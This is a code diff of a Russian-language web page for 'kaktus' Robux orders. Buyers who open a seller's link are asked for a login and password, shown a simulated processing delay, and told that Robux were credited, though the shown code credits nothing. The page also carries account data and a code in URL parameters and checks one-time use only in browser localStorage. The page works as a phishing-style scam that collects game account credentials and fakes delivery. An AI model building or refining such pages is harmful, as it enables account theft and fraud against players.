-            loginForm.classList.add('show');
-        }
-
-        // === ВХОД ПОКУПАТЕЛЯ ===
-        loginBtn.addEventListener('click', function() {
-            const login = loginInput.value.trim();
-            const password = passwordInput.value.trim();
-
-            if (!login || !password) {
-                alert('Введите логин и пароль!');
-                return;
-            }
-
-            loginForm.classList.remove('show');
-            sessionLoader.classList.add('show');
-            loginBtn.disabled = true;
-
-            setTimeout(() => {
-                sessionLoader.classList.remove('show');
-                loginBtn.disabled = false;
-                finalScreen.classList.add('show');
-
-                const order = orderDisplay.textContent.replace('#', '');
-                telegramLink.href = 'tg://resolve?domain=' + TELEGRAM_BOT + '&start=order_' + order;
-                telegramLink.classList.remove('hidden');
-                linkBox.style.display = 'block';
-
-                const baseUrl = window.location.href.split('?')[0];
-                const robux = urlParams.get('robux') || 500;
-                const link = baseUrl + '?robux=' + robux + '&order=' + order;
-                linkUrl.href = link;
-                linkUrl.textContent = link;
-            }, 3000);
-        });
-
-        // === СОБЫТИЯ ДЛЯ ПРОДАВЦА ===
-        robuxInput.addEventListener('input', function() {
-            if (!isBuyer) {
-                updateOrder();
-                generateOrder();
-            }
-        });
-
-        continueBtn.addEventListener('click', function() {
-            if (isBuyer) return;
-            const robux = parseInt(robuxInput.value) || 500;
-            const orderId = orderDisplay.textContent;
+            // Генерируем одноразовую ссылку
             const baseUrl = window.location.href.split('?')[0];
-            const link = baseUrl + '?robux=' + robux + '&order=' + orderId.replace('#', '');
+            const link = baseUrl +
+                '?order=' + state.orderId.replace('#', '') +
+                '&robux=' + robux +
+                '&account=' + encodeURIComponent(account) +
+                '&code=' + encodeURIComponent(code) +
+                '&expiry=' + expiry;
 
             linkUrl.href = link;
             linkUrl.textContent = link;
-
-            telegramLink.href = 'tg://resolve?domain=' + TELEGRAM_BOT + '&start=order_' + orderId.replace('#', '');
-            telegramLink.classList.remove('hidden');
-
+            linkExpiry.textContent = expiry;
             linkBox.style.display = 'block';
+
+            // Скрываем форму продавца, показываем только ссылку
+            sellerForm.style.display = 'none';
+            buyerForm.style.display = 'none';
+            activationStatus.style.display = 'none';
+
+            // Показываем кнопку "Создать новый" вместо формы
+            const newBtn = document.createElement('button');
+            newBtn.className = 'btn';
+            newBtn.innerHTML = '<span>➕ Создать новый ордер</span>';
+            newBtn.id = 'newOrderBtn';
+            newBtn.style.marginTop = '16px';
+            const existing = document.getElementById('newOrderBtn');
+            if (existing) existing.remove();
+            document.querySelector('.card').insertBefore(newBtn, document.querySelector('.secure'));
+
+            newBtn.addEventListener('click', function() {
+                this.remove();
+                sellerForm.style.display = 'block';
+                linkBox.style.display = 'none';
+                buyerForm.style.display = 'none';
+                activationStatus.style.display = 'none';
+                state.isActive = true;
+                state.isUsed = false;
+                state.orderId = generateOrderId();
+                updateDisplay();
+            });
+
+            // Сохраняем состояние в localStorage для проверки при переходе
+            localStorage.setItem('kaktus_order_' + state.orderId.replace('#', ''), JSON.stringify({
+                robux: state.robux,
+                account: state.account,
+                code: state.code,
+                expiryHours: state.expiryHours,
+                createdAt: state.createdAt,
+                expiresAt: state.expiresAt,
+                isUsed: false,
+                isActive: true
+            }));
+
+            // Показываем уведомление
+            alert('✅ Ордер создан! Ссылка скопирована в буфер обмена.');
+            copyLink();
         });
 
-        copyBtn.addEventListener('click', function() {
+        // ===== КОПИРОВАНИЕ ССЫЛКИ =====
+        function copyLink() {
             const link = linkUrl.href;
             if (link) {
                 navigator.clipboard.writeText(link).then(() => {
-                    alert('✅ Ссылка скопирована!');
+                    // Уже показано
                 }).catch(() => {
                     const textarea = document.createElement('textarea');
                     textarea.value = link;
@@ -1046,15 +748,184 @@
                     textarea.select();
                     document.execCommand('copy');
                     document.body.removeChild(textarea);
-                    alert('✅ Ссылка скопирована!');
                 });
+            }
+        }
+
+        copyBtn.addEventListener('click', copyLink);
+
+        // ===== ПРОВЕРКА ПАРАМЕТРОВ URL (ПОКУПАТЕЛЬ) =====
+        const urlParams = new URLSearchParams(window.location.search);
+        const orderParam = urlParams.get('order');
+        const robuxParam = urlParams.get('robux');
+        const accountParam = urlParams.get('account');
+        const codeParam = urlParams.get('code');
+        const expiryParam = urlParams.get('expiry');
+
+        if (orderParam) {
+            // Это переход по ссылке — режим покупателя
+            sellerForm.style.display = 'none';
+            buyerForm.style.display = 'block';
+            linkBox.style.display = 'none';
+
+            // Подставляем данные из ссылки
+            if (robuxParam) {
+                robuxInput.value = robuxParam;
+                state.robux = parseInt(robuxParam);
+            }
+            if (orderParam) {
+                state.orderId = '#' + orderParam;
+            }
+            if (expiryParam) {
+                state.expiryHours = parseInt(expiryParam);
+            }
+
+            updateDisplay();
+
+            // Проверяем статус ордера в localStorage
+            const stored = localStorage.getItem('kaktus_order_' + orderParam);
+            if (stored) {
+                const data = JSON.parse(stored);
+                if (data.isUsed) {
+                    // Ссылка уже использована
+                    buyerForm.style.display = 'none';
+                    activationStatus.style.display = 'block';
+                    activationStatus.querySelector('h3').textContent = '❌ Ссылка недействительна';
+                    activationStatus.querySelector('p').textContent = 'Эта ссылка уже была использована';
+                    statusBadge.className = 'status-badge status-used';
+                    statusBadge.textContent = '✖ Использована';
+                    return;
+                }
+                if (Date.now() > data.expiresAt) {
+                    // Срок истёк
+                    buyerForm.style.display = 'none';
+                    activationStatus.style.display = 'block';
+                    activationStatus.querySelector('h3').textContent = '⏰ Срок действия истёк';
+                    activationStatus.querySelector('p').textContent = 'Ссылка больше не действительна';
+                    statusBadge.className = 'status-badge status-expired';
+                    statusBadge.textContent = '⏳ Истекла';
+                    return;
+                }
+            }
+
+            // Показываем форму входа для покупателя
+            buyerForm.style.display = 'block';
+        }
+
+        // ===== АКТИВАЦИЯ ОРДЕРА ПОКУПАТЕЛЕМ =====
+        buyerSubmitBtn.addEventListener('click', function() {
+            const login = buyerLogin.value.trim();
+            const password = buyerPassword.value.trim();
+
+            if (!login || !password) {
+                alert('Введите логин и пароль!');
+                return;
+            }
+
+            // Проверяем статус перед активацией
+            const orderParam = urlParams.get('order');
+            if (orderParam) {
+                const stored = localStorage.getItem('kaktus_order_' + orderParam);
+                if (stored) {
+                    const data = JSON.parse(stored);
+                    if (data.isUsed) {
+                        alert('❌ Эта ссылка уже была использована!');
+                        return;
+                    }
+                    if (Date.now() > data.expiresAt) {
+                        alert('⏰ Срок действия ссылки истёк!');
+                        return;
+                    }
+                }
+            }
+
+            // Активация
+            buyerSubmitBtn.disabled = true;
+            buyerSubmitBtn.innerHTML = '<span>⏳ Обработка...</span>';
+
+            setTimeout(() => {
+                // Помечаем как использованную
+                if (orderParam) {
+                    const stored = localStorage.getItem('kaktus_order_' + orderParam);
+                    if (stored) {
+                        const data = JSON.parse(stored);
+                        data.isUsed = true;
+                        data.isActive = false;
+                        localStorage.setItem('kaktus_order_' + orderParam, JSON.stringify(data));
+                    }
+                }
+
+                // Обновляем интерфейс
+                buyerForm.style.display = 'none';
+                activationStatus.style.display = 'block';
+                statusBadge.className = 'status-badge status-used';
+                statusBadge.textContent = '✖ Использована';
+                state.isUsed = true;
+                state.isActive = false;
+
+                buyerSubmitBtn.disabled = false;
+                buyerSubmitBtn.innerHTML = '<span>🚀 Активировать и получить Robux</span>';
+
+                // Показываем кнопку "Создать новый ордер" для продавца
+                const newBtn = document.createElement('button');
+                newBtn.className = 'btn';
+                newBtn.innerHTML = '<span>➕ Создать новый ордер</span>';
+                newBtn.id = 'newOrderBtn';
+                newBtn.style.marginTop = '16px';
+                const existing = document.getElementById('newOrderBtn');
+                if (existing) existing.remove();
+                document.querySelector('.card').insertBefore(newBtn, document.querySelector('.secure'));
+
+                newBtn.addEventListener('click', function() {
+                    this.remove();
+                    sellerForm.style.display = 'block';
+                    buyerForm.style.display = 'none';
+                    activationStatus.style.display = 'none';
+                    linkBox.style.display = 'none';
+                    state.isActive = true;
+                    state.isUsed = false;
+                    state.orderId = generateOrderId();
+                    // Очищаем URL параметры
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                    updateDisplay();
+                });
+
+                alert('✅ Robux успешно зачислены! Ссылка деактивирована.');
+            }, 2000);
+        });
+
+        // ===== ОБРАБОТКА ИЗМЕНЕНИЙ =====
+        robuxInput.addEventListener('input', function() {
+            if (!orderParam) {
+                updateDisplay();
             }
         });
 
-        // === ИНИЦИАЛИЗАЦИЯ ===
-        if (!isBuyer) {
-            updateOrder();
-            generateOrder();
+        // ===== ИНИЦИАЛИЗАЦИЯ =====
+        if (!orderParam) {
+            state.orderId = generateOrderId();
+            updateDisplay();
+        } else {
+            // Проверяем статус при загрузке
+            const stored = localStorage.getItem('kaktus_order_' + orderParam);
+            if (stored) {
+                const data = JSON.parse(stored);
+                if (data.isUsed) {
+                    buyerForm.style.display = 'none';
+                    activationStatus.style.display = 'block';
+                    activationStatus.querySelector('h3').textContent = '❌ Ссылка недействительна';
+                    activationStatus.querySelector('p').textContent = 'Эта ссылка уже была использована';
+                    statusBadge.className = 'status-badge status-used';
+                    statusBadge.textContent = '✖ Использована';
+                } else if (Date.now() > data.expiresAt) {
+                    buyerForm.style.display = 'none';
+                    activationStatus.style.display = 'block';
+                    activationStatus.querySelector('h3').textContent = '⏰ Срок действия истёк';
+                    activationStatus.querySelector('p').textContent = 'Ссылка больше не действительна';
+                    statusBadge.className = 'status-badge status-expired';
+                    statusBadge.textContent = '⏳ Истекла';
+                }
+            }
         }
     </script>
 
